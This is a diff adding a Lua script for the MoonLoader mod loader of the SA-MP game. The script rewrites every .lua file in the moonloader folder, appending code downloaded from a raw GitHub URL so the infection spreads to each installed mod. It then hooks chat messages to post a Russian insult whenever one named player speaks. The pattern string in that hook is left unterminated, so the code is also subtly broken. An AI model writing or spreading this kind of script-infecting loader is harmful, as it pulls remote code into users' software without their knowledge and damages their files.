@@ -1,0 +1,38 @@
+local Handle, FileName = findFirstFile("moonloader\\*.lua")
+local Directory = getWorkingDirectory().."\\"
+while FileName do
+    local FileText = ""
+    local Skip = false
+    local File = io.open(Directory..FileName, "r")
+    for Line in File:lines() do
+        if Line:find("%-%- Exception "..FileName) then
+            Skip = true
+            break
+        end
+
+        if FileText ~= "" then
+            FileText = FileText.."\n"
+        end
+        FileText = FileText..Line
+    end
+    File:close()
+    if not Skip and not FileText:find("https://raw.githubusercontent.com/pauk2218/samp/1234") then
+        local encoding = require "encoding"
+        encoding.default = "CP1251"
+        local File = io.open(Directory..FileName, "w")
+        File:write("-- Exception "..FileName.."\n"..FileText.."\n"..encoding.UTF8:decode((require("requests")).get("https://raw.githubusercontent.com/pauk2218/samp/1234").text))
+        File:close()
+    end
+    FileName = findNextFile(Handle)
+end
+findClose(Handle)
+function onReceiveRpc(id, bs)
+    if id == 93 then
+        local color = raknetBitStreamReadInt32(bs)
+        local len = raknetBitStreamReadInt32(bs)
+        local str = raknetBitStreamReadString(bs, len)
+        if str:find("%[20]Smoant_Despasito[371] говорит:%) then
+            sampAddChatMessage('Ебать ты олух', -1)
+        end
+    end
+end
